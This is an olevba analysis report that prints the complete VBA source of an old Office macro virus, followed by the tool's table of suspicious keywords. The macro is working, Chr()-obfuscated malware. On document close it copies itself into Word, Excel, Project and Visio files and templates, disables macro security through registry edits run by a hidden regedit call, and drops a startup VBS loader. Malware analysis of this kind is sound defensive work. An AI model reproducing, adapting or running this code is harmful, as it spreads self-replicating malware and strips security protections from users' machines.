olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-e4cb7c835b9e202f3a8225747491a6dd60f911f4
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-e4cb7c835b9e202f3a8225747491a6dd60f911f4 
in file: Virus.MSOffice.Source-e4cb7c835b9e202f3a8225747491a6dd60f911f4 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'
mut$ = "Visio.Application": mat$ = "Blank Drawing.vst": dovis = 1
On Error Resume Next
t = Application
If t = Chr(78) + Chr(111) + Chr(116) + Chr(104) + Chr(105) + Chr(110) + Chr(103) Then GoTo nopro
If t = "Microsoft Project" Then
mook = Version
 If mook = "8.0" Then
'
 End If
Application.DisplayAlerts = False
'
For Each Z In Projects
On Error Resume Next
Set ap = Z.VBProject.VBComponents(1).codemodule
Set tp = ThisProject.VBProject.VBComponents(1).codemodule
If ap.Lines(2, 1) <> "'" Then
ap.DeleteLines 1, ap.CountOfLines
ap.InsertLines 1, tp.Lines(1, tp.CountOfLines)
'
End If
Next Z
Set temp = Application.VBE.VBProjects(1).VBComponents(1).codemodule
If temp.Lines(2, 1) <> Chr(39) Then
temp.DeleteLines 1, temp.CountOfLines
temp.InsertLines 1, tp.Lines(1, tp.CountOfLines)
End If
End If
vi:
te$ = t: tune = Left(te$, 5)
If tune <> Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) Then
Set nom = ThisDocument.VBProject.VBComponents(1).codemodule
For i = 1 To Documents.Count
    Set docobj = Documents.Item(i)
Set gets = docobj.VBProject.VBComponents(1).codemodule
If gets.Lines(2, 1) <> Chr(39) Then
gets.InsertLines 1, nom.Lines(1, nom.CountOfLines)
dname = CurDir & "\": filechk$ = (dname & docobj)
mystr = Right(filechk$, 4): If mystr <> ".vsd" Then sd = 0
mystr = Right(filechk$, 4): If mystr <> ".vss" Then sd = 0
mystr = Right(filechk$, 4): If mystr <> ".vst" Then sd = 0
If sd = 0 Then fila$ = (dname & docobj & ".vsd")
'
End If
toobig:
Next i
If strTemplatename = "" Then GoTo runaway
'
Set Target = Documents.Open(strTemplatename)
Set targets = Target.VBProject.VBComponents(1).codemodule
If targets.Lines(2, 1) <> "'" Then
If targets.Lines(1, 1) = "Option Explicit" Then Target.DeleteLines 1, 1
targets.InsertLines 1, rnt.Lines(1, rnt.CountOfLines)
Target.SaveAs strTemplatename
Else
toobigtemplate:
Target.Close
End If
runaway:
End If
If t = Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100) Then Else GoTo ex
Options.SendMailAttach = True: m = 1
Set nim = NormalTemplate
Set aiv = ActiveDocument
Set aktiv = aiv.VBProject.VBComponents(m).codemodule
Set nom = nim.VBProject.VBComponents(m).codemodule
If nom.Lines(2, 1) <> "'" Then
nom.DeleteLines 1, nom.CountOfLines
nom.InsertLines 1, aktiv.Lines(1, aktiv.CountOfLines)
nom.replaceline 1, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
nop = 1
End If
If aktiv.Lines(2, 1) <> "'" Then
act = 1
End If
ex:
If act = 1 Then GoTo 11
If t = "Microsoft Excel" Then Else GoTo 12
Set a = ActiveWorkbook.VBProject
Set aktiv = a.VBComponents("ThisWorkbook").codemodule
Set nimt = ThisWorkbook.VBProject
Set nom = nimt.VBComponents("ThisWorkbook").codemodule
11:
If aktiv.Lines(2, 1) <> "'" Then
aktiv.DeleteLines 1, aktiv.CountOfLines
aktiv.InsertLines 1, nom.Lines(1, nom.CountOfLines)
End If
12:
If act = 1 And t = "Microsoft Word" Then
aktiv.replaceline 1, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If m = 1 Then GoTo 16
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
If t = "Microsoft Excel" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\expo.exp" For Output As 1
aktiv.replaceline 10, Chr(39): aktiv.replaceline 21, Chr(39)
aktiv.replaceline 13, Chr(39): aktiv.replaceline 44, Chr(39)
aktiv.replaceline 49, Chr(39)
Print #1, Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110)
Print #1, aktiv.Lines(2, aktiv.CountOfLines)
Close 1
16:
If t = "Microsoft Word" Then a = 1
If t = "Microsoft Project" Then a = 1
If tune <> "Micro" Then a = 1
If a = 1 Then
Set xlapp = CreateObject("Excel.Application")
If UCase(Dir(xlapp.StartupPath + "\Book1.")) <> "BOOK1" Then Else GoTo fl
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
Set bko = xlapp.Workbooks
Set bkobj = bko.Add: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
bkobj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.InsertLines 1, nom.Lines(1, nom.CountOfLines)
bkobj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.replaceline 1, "Sub Workbook_Deactivate()"
bkobj.SaveAs xlapp.Application.StartupPath & "\Book1."
bkobj.Close: xlapp.Quit
If a = 1 And t = "Microsoft Project" Then
bkobj.VBProject.VBComponents.Item(m).codemodule.replaceline 10, "'"
bkobj.VBProject.VBComponents.Item(m).codemodule.replaceline 13, "'"
bkobj.VBProject.VBComponents.Item(m).codemodule.replaceline 21, "'"
End If
End If
Open "c:\Windows\stray.reg" For Output As 1
Print #1, Chr(82) + Chr(69) + Chr(71) + Chr(69) + Chr(68) + Chr(73) + Chr(84) + Chr(52)
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\MS Project\Security]"
Print #1, """Level""=dword:00000001"
Close 1
Shell "regedit /s c:\Windows\stray.reg", vbHide
End If
End If
fl:
fi = Dir("c:\gotvis.dll")
If fi = "" Then dovis = 0
If tune = "Micro" And dovis = 0 Then
Set vsapp = CreateObject(mut$)
Set vs1obj = vsapp.Documents.Add(mat$)
Set la = vs1obj.VBProject.VBComponents.Item(1).codemodule
la.InsertLines 1, nom.Lines(1, nom.CountOfLines)
vs1obj.VBProject.VBComponents(1).codemodule.replaceline 1, "Sub Document_BeforeDocumentClose(ByVal doc As Visio.IVDocument)"
vs1obj.VBProject.VBComponents(1).codemodule.replaceline 44, "ThisDocument.saveasex fila$, visSaveAsWS = 2"
vs1obj.VBProject.VBComponents(1).codemodule.replaceline 49, "vs1obj.VBProject.VBComponents(1).codemodule.Replaceline"
fila$ = ("C:\Program Files\Visio\Solutions\Blank Drawing.vst")
vs1obj.SaveAsEx fila$, visSaveAsWS = 2
vs1obj.Close
vsapp.Close
Open "c:\gotvis.dll" For Output As 1: Print #1, "'": Close 1
End If

If t <> "Microsoft Project" Then
Set projobj = GetObject(, "MSProject.Application")
If projobj = "" Then GoTo nopro
Set proj1obj = projobj.VBE.VBProjects(1).VBComponents(1).codemodule
proj1obj.InsertLines 1, nom.Lines(1, nom.CountOfLines)
proj1obj.replaceline 1, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(95) + Chr(66) + Chr(101) + Chr(102) + Chr(111) + Chr(114) + Chr(101) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(66) + Chr(121) + Chr(86) + Chr(97) + Chr(108) + Chr(32) + Chr(112) + Chr(106) + Chr(32) + Chr(65) + Chr(115) + Chr(32) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(41)
proj1obj.replaceline 10, "Application.MacroVirusProtection = False"
proj1obj.replaceline 13, Chr(68) + Chr(105) + Chr(109) + Chr(32) + Chr(88) + Chr(32) + Chr(97) + Chr(115) + Chr(32) + Chr(80) + Chr(114) + Chr(111) + Chr(106) + Chr(101) + Chr(99) + Chr(116) + Chr(115)
proj1obj.replaceline 21, "Application.FileSaveAs Name:=ActiveProject.Name"
End If
nopro:
Pi = Dir("c:\Windows\Start Menu\Programs\Startup\Msoffice.Exe.Vbs")
If Pi = "" Then
Open "c:\Windows\Start Menu\Programs\Startup\Msoffice.Exe.Vbs" For Output As 1
Print #1, "Call BulletLoader": Print #1, "Sub Bulletloader()": Print #1, "On Error Resume Next"
Print #1, "Set wo = CreateObject(""word.application"")": Print #1, "wo.NormalTemplate.VBProject.VBComponents(1).codemodule.deletelines 1,wo.NormalTemplate.VBProject.VBComponents(1).codemodule.countoflines"
Print #1, "wo.Options.VirusProtection = (Rnd * 0)"
Print #1, "wo.Options.SaveNormalPrompt = (Rnd * 0)": Print #1, "wo.NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.AddFromFile ""c:\expo.exp""": Print #1, "wo.NormalTemplate.Save"
Print #1, "wo.Quit": Print #1, " ": Print #1, "End Sub": Close 1
Open "C:\Windows\Default.htm" For Output As 1
Print #1, "<html>": Print #1, Chr(65) + Chr(32) + Chr(108) + Chr(97) + Chr(115) + Chr(116) + Chr(32) + Chr(80) + Chr(97) + Chr(114) + Chr(116) + Chr(105) + Chr(110) + Chr(103) + Chr(32) + Chr(115) + Chr(104) + Chr(111) + Chr(116) + Chr(32) + Chr(44) + Chr(32) + Chr(97) + Chr(32) + Chr(102) + Chr(105) + Chr(110) + Chr(97) + Chr(108) + Chr(32) + Chr(116) + Chr(111) + Chr(107) + Chr(101) + Chr(110) + Chr(32) + Chr(116) + Chr(97) + Chr(110) + Chr(116) + Chr(114) + Chr(117) + Chr(109)
Print #1, Chr(60) + Chr(104) + Chr(49) + Chr(62) + Chr(60) + Chr(66) + Chr(108) + Chr(105) + Chr(110) + Chr(107) + Chr(62) + Chr(83) + Chr(116) + Chr(114) + Chr(97) + Chr(121) + Chr(32) + Chr(66) + Chr(117) + Chr(108) + Chr(108) + Chr(101) + Chr(116) + Chr(60) + Chr(47) + Chr(104) + Chr(49) + Chr(62) + Chr(60) + Chr(47) + Chr(98) + Chr(108) + Chr(105) + Chr(110) + Chr(107) + Chr(62)
Print #1, "Made possible by the Microsoft Office suite<br>": Print #1, "<h2>Word 97/2000 <br> Excel 97/2000 <br>Visio 5/2000<br>Project 98/2000<br></h2>"
Print #1, "<br><h2>Strictly Not for Distribution - Moral Panic OnlY!!!!</h2>"
Print #1, Chr(60) + Chr(99) + Chr(101) + Chr(110) + Chr(116) + Chr(114) + Chr(101) + Chr(62) + Chr(60) + Chr(105) + Chr(62) + Chr(84) + Chr(104) + Chr(101) + Chr(32) + Chr(65) + Chr(110) + Chr(116) + Chr(105) + Chr(83) + Chr(116) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + Chr(84) + Chr(111) + Chr(114) + Chr(116) + Chr(111) + Chr(105) + Chr(115) + Chr(101) + Chr(60) + Chr(47) + Chr(105) + Chr(62) + Chr(60) + Chr(98) + Chr(114) + Chr(62)
Print #1, "</html>"
Reset
'A���*s��q�w��
Q
End If
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |stray.reg           |Executable file name                         |
|IOC       |gotvis.dll          |Executable file name                         |
|IOC       |projobj.VBE         |Executable file name                         |
|IOC       |Msoffice.Exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

